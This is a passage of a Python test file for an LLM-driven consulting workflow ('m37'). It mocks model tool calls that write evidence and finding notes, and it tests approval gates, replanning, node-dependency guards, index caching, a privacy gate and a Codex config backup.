    generate_plan_from_archetype(ws, enc_l1, archetype_name="ARQ_Diagnostico-Cualitativo", env={"GEMINI_API_KEY": "k"})
    approve_gate(ws, enc_l1, 2, approver="socia")

    def _l1_mock_llm(*, model: str, messages: list[dict[str, Any]], tools: Any = None, **kwargs: Any) -> dict[str, Any]:
        if messages[-1]["role"] == "tool":
            return {"choices": [{"message": {"content": "Terminado.", "tool_calls": None}}], "usage": {"prompt_tokens": 5, "completion_tokens": 2}}
        user_txt = messages[1]["content"]
        if "(N-01)" in user_txt:
            return {
                "choices": [
                    {
                        "message": {
                            "content": "",
                            "tool_calls": [
                                {
                                    "id": "c1",
                                    "function": {
                                        "name": "write_note",
                                        "arguments": json.dumps(
                                            {
                                                "path": f"vault/20_Encargos/{enc_l1}/Evidencia_Interna/EI-{enc_l1}-01.md",
                                                "content": dump_markdown_note(
                                                    {
                                                        "id": f"EI-{enc_l1}-01",
                                                        "tipo": "evidencia",
                                                        "visibilidad": "interna_encargo",
                                                        "encargo_origen": enc_l1,
                                                        "clase": "dato",
                                                        "titulo": "Nota L1",
                                                        "emisor_o_autor": "Analista",
                                                        "fecha_publicacion": "2026-10",
                                                        "fecha_verificacion": "2026-10-15",
                                                        "vigencia_dias_max": 365,
                                                        "localizador_verificable": "p. 1",
                                                        "fiabilidad": "media",
                                                    },
                                                    (
                                                        "## Síntesis sustantiva\n\nSíntesis L1.\n\n"
                                                        "## Extracto o referencia verificable\n\nCita L1.\n\n"
                                                        "## Límites y sesgos de la fuente\n\nNinguno.\n"
                                                    ),
                                                ),
                                            }
                                        ),
                                    },
                                }
                            ],
                        }
                    }
                ],
                "usage": {"prompt_tokens": 15, "completion_tokens": 8},
            }
        return {
            "choices": [
                {
                    "message": {
                        "content": "",
                        "tool_calls": [
                            {
                                "id": "c2",
                                "function": {
                                    "name": "write_note",
                                    "arguments": json.dumps(
                                        {
                                            "path": f"vault/20_Encargos/{enc_l1}/Hallazgos/H-{enc_l1}-01.md",
                                            "content": dump_markdown_note(
                                                {
                                                    "id": f"H-{enc_l1}-01",
                                                    "tipo": "hallazgo",
                                                    "encargo": enc_l1,
                                                    "dominio": "estrategia-base",
                                                    "naturaleza": "empirico",
                                                    "afirmacion_corta": "Observación exploratoria L1.",
                                                    "sustento_evidencia": [f"[[EI-{enc_l1}-01]]"],
                                                    "sustento_derivaciones": [],
                                                    "metodo": "matriz-comparativa-alternativas",
                                                    "confianza": "media",
                                                    "contrahipotesis_probadas": 0,
                                                    "que_lo_refutaria": "Nueva evidencia contraria en campo.",
                                                    "estado_qa": "pendiente",
                                                },
                                                (
                                                    "## Afirmación\n\nHallazgo L1.\n\n"
                                                    f"## Sustento y trazabilidad\n\n[[EI-{enc_l1}-01]].\n\n"
                                                    "## Explicaciones rivales descartadas\n\nNo aplica en L1.\n\n"
                                                    "## Condiciones de validez y límites\n\nExploratorio.\n"
                                                ),
                                            ),
                                        }
                                    ),
                                },
                            }
                        ],
                    }
                }
            ],
            "usage": {"prompt_tokens": 20, "completion_tokens": 10},
        }

    res1 = run_engagement(ws, enc_l1, target_node_id="N-01", env={"GEMINI_API_KEY": "k"}, completion_fn=_l1_mock_llm)
    assert res1["N-01"]["estado"] == "aceptado"

    res2 = run_engagement(ws, enc_l1, target_node_id="N-02", env={"GEMINI_API_KEY": "k"}, completion_fn=_l1_mock_llm)
    assert res2["N-02"]["estado"] == "aceptado"

    h_meta, _ = parse_raw_artifact(
        (ws.engagement_dir(enc_l1) / "Hallazgos" / f"H-{enc_l1}-01.md").read_text(encoding="utf-8"),
        suffix=".md",
    )
    assert h_meta["estado_qa"] == "pendiente"
    ep_events = [json.loads(line) for line in ws.episodios_path().read_text(encoding="utf-8").splitlines() if line.strip()]
    l1_ev_n1 = [e for e in ep_events if e.get("encargo") == enc_l1 and e.get("nodo") == "N-01"][-1]
    l1_ev_n2 = [e for e in ep_events if e.get("encargo") == enc_l1 and e.get("nodo") == "N-02"][-1]
    assert l1_ev_n1["veredicto_qa_r1"] is None and l1_ev_n1["aprobado_r1"] is None
    assert l1_ev_n2["veredicto_qa_r1"] is None and l1_ev_n2["aprobado_r1"] is None


# ----------------------------------------------------------------------------------------------------------------------
# H10 — Replanning gate check, MCP DAG dependency check, and _ensure_index mtime cache
# ----------------------------------------------------------------------------------------------------------------------
def test_h10_replanning_gate_mcp_dep_guard_and_index_mtime_cache(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ws_dir = tmp_path / "ws_h10"
    _mcp_call(
        "m37_init_or_new_engagement",
        {
            "vault": str(ws_dir),
            "id_encargo": "ENC-H10",
            "cliente": "ACME",
            "rigor": "L2",
            "pregunta": "¿Cuál es el plan operativo recomendado?",
        },
        vault=ws_dir,
    )
    ws = WorkspacePaths.from_root(ws_dir)
    approve_gate(ws, "ENC-H10", 1, approver="socia")
    _mcp_call("m37_plan_engagement", {"id_encargo": "ENC-H10", "arquetipo": "ARQ_Analisis-Cuantitativo", "vault": str(ws_dir)}, vault=ws_dir)
    approve_gate(ws, "ENC-H10", 2, approver="socia")
    assert evaluate_gate_2(ws.engagement_dir("ENC-H10"))[0] is True

    # 1. Replanning without motivo_replanificacion is blocked
    err_replan = _mcp_error("m37_plan_engagement", {"id_encargo": "ENC-H10", "vault": str(ws_dir)}, vault=ws_dir)
    assert "Puerta 2 aprobada" in err_replan

    # Replanning WITH motivo increments version and resets Gate 2
    _mcp_call(
        "m37_plan_engagement",
        {
            "id_encargo": "ENC-H10",
            "arquetipo": "ARQ_Analisis-Cuantitativo",
            "motivo_replanificacion": "Ajuste de alcance operativo",
            "vault": str(ws_dir),
        },
        vault=ws_dir,
    )
    plan_meta, _ = parse_raw_artifact((ws.engagement_dir("ENC-H10") / "01_Plan.md").read_text(encoding="utf-8"), suffix=".md")
    assert plan_meta["version"] == 2
    assert plan_meta["motivo_replanificacion"] == "Ajuste de alcance operativo"
    assert evaluate_gate_2(ws.engagement_dir("ENC-H10"))[0] is False
    approve_gate(ws, "ENC-H10", 2, approver="socia")

    # 2. MCP DAG dependency check blocks N-02 before N-01 produces evidence
    err_dep = _mcp_error(
        "m37_write_artifact",
        {
            "id_encargo": "ENC-H10",
            "node_id": "N-02",
            "action": "write_script",
            "path": "analisis/ENC-H10/s.py",
            "content": "print(1)\n",
            "vault": str(ws_dir),
        },
        vault=ws_dir,
    )
    assert "dependencia N-01" in err_dep

    # Write N-01 evidence -> N-02 succeeds
    _mcp_call(
        "m37_write_artifact",
        {
            "id_encargo": "ENC-H10",
            "node_id": "N-01",
            "action": "write_note",
            "path": "vault/20_Encargos/ENC-H10/Evidencia_Interna/EI-H10-01.md",
            "content": dump_markdown_note(
                {
                    "id": "EI-H10-01",
                    "tipo": "evidencia",
                    "visibilidad": "interna_encargo",
                    "encargo_origen": "ENC-H10",
                    "clase": "dato",
                    "titulo": "Evidencia N-01",
                    "emisor_o_autor": "Interno",
                    "fecha_publicacion": "2026-10",
                    "fecha_verificacion": "2026-10-15",
                    "vigencia_dias_max": 365,
                    "localizador_verificable": "p. 1",
                    "fiabilidad": "alta",
                },
                (
                    "## Síntesis sustantiva\n\nDato base.\n\n"
                    "## Extracto o referencia verificable\n\nCita.\n\n"
                    "## Límites y sesgos de la fuente\n\nNinguno.\n"
                ),
            ),
            "vault": str(ws_dir),
        },
        vault=ws_dir,
    )
    _mcp_call(
        "m37_write_artifact",
        {
            "id_encargo": "ENC-H10",
            "node_id": "N-02",
            "action": "write_script",
            "path": "analisis/ENC-H10/s.py",
            "content": "print('{\"x\": 1}')\n",
            "vault": str(ws_dir),
        },
        vault=ws_dir,
    )

    # Blocked upstream node state blocks downstream write even if evidence exists
    n1_file = ws.engagement_dir("ENC-H10") / "Nodos" / "N-01.md"
    n1_meta, n1_body = parse_raw_artifact(n1_file.read_text(encoding="utf-8"), suffix=".md")
    n1_meta["estado"] = "escalado_humano"
    write_utf8_lf(n1_file, dump_markdown_note(n1_meta, n1_body))
    err_blocked = _mcp_error(
        "m37_write_artifact",
        {
            "id_encargo": "ENC-H10",
            "node_id": "N-02",
            "action": "write_script",
            "path": "analisis/ENC-H10/s2.py",
            "content": "print('{\"y\": 2}')\n",
            "vault": str(ws_dir),
        },
        vault=ws_dir,
    )
    assert "escalado_humano" in err_blocked

    # 3. _ensure_index skips reindex when index is fresher than vault sources
    import m37.mcp_server as mcp_mod

    orig_loader = mcp_mod._load_reindex_module
    real_mod = orig_loader()
    reindex_calls = 0

    class _SpyMod:
        def __getattr__(self, item: str) -> Any:
            return getattr(real_mod, item)

        def reindex_vault_to_duckdb(self, paths_arg: Any) -> Any:
            nonlocal reindex_calls
            reindex_calls += 1
            return real_mod.reindex_vault_to_duckdb(paths_arg)

    monkeypatch.setattr(mcp_mod, "_load_reindex_module", lambda: _SpyMod())
    _ensure_index(ws)
    assert reindex_calls == 1
    _ensure_index(ws)
    assert reindex_calls == 1

    # Bump a source file mtime cleanly past index mtime -> triggers reindex
    idx_file = next(p for p in (ws.duckdb_index_path(), ws.duckdb_index_path().with_suffix(".json")) if p.is_file())
    future_ns = idx_file.stat().st_mtime_ns + 2_000_000_000
    os.utime(ws.engagement_dir("ENC-H10") / "00_Brief.md", ns=(future_ns, future_ns))
    _ensure_index(ws)
    assert reindex_calls == 2


# ----------------------------------------------------------------------------------------------------------------------
# Low severity — runner contract error double-count, Ollama privacy gate, harness version & codex config backup
# ----------------------------------------------------------------------------------------------------------------------
def test_low_severity_runner_contract_error_ollama_privacy_and_codex_backup(tmp_path: Path) -> None:
    ws = init_workspace(tmp_path / "ws_low")
    enc_id = "ENC-LOW"
    create_new_engagement(ws, enc_id, "ACME", rigor="L1")
    catalog = load_model_catalog(ws.modelos_yaml_path())
    model_entry = catalog.modelos["gemini_flash"]

    ctx = AgentExecutionContext(
        engagement_id=enc_id,
        client_id="ACME",
        node_id="N-01",
        profile="documental",
        model_alias="gemini_flash",
        model_family="google",
    )

    step = 0

    def _invalid_contract_llm(*, model: str, messages: list[dict[str, Any]], tools: Any = None, **kwargs: Any) -> dict[str, Any]:
        nonlocal step
        step += 1
        if step == 1:
            return {
                "choices": [
                    {
                        "message": {
                            "content": "",
                            "tool_calls": [
                                {
                                    "id": "bad_c",
                                    "function": {
                                        "name": "write_note",
                                        "arguments": json.dumps(
                                            {
                                                "path": f"vault/20_Encargos/{enc_id}/Evidencia_Interna/EI-{enc_id}-01.md",
                                                "content": "---\ntipo: evidencia\ncampo_invalido: 1\n---\nTexto.\n",
                                            }
                                        ),
                                    },
                                }
                            ],
                        }
                    }
                ],
                "usage": {"prompt_tokens": 10, "completion_tokens": 5},
            }
        return {"choices": [{"message": {"content": "Fin.", "tool_calls": None}}], "usage": {"prompt_tokens": 5, "completion_tokens": 2}}

    outcome = execute_stateless_node_loop(ws, ctx, model_entry, "sys", "usr", max_turns=3, completion_fn=_invalid_contract_llm)
    assert outcome.contract_errors == 1
    assert outcome.guard_violations == []

    # Local Ollama-only exempts check_privacy_gate unless cloud keys are also set
    check_privacy_gate("L4", {"M37_ENABLE_LOCAL_OLLAMA": "1"})
    with pytest.raises(PrivacyGateError):
        check_privacy_gate("L4", {"M37_ENABLE_LOCAL_OLLAMA": "1", "OPENAI_API_KEY": "sk-cloud"})

    # Harness version interpolation & Codex config backup
    assert f"v{m37.__version__}" in M37_SKILL_MARKDOWN
    codex_cfg = tmp_path / ".codex" / "config.toml"
    codex_cfg.parent.mkdir(parents=True, exist_ok=True)
    original_toml = 'model = "gpt-5"\n'
    codex_cfg.write_text(original_toml, encoding="utf-8")
    _upsert_codex_config_toml(codex_cfg, python_cmd="python")
    bak = codex_cfg.with_name("config.toml.m37.bak")
    assert bak.is_file()
    assert bak.read_text(encoding="utf-8") == original_toml
    assert "[mcp_servers.m37_kernel]" in codex_cfg.read_text(encoding="utf-8")
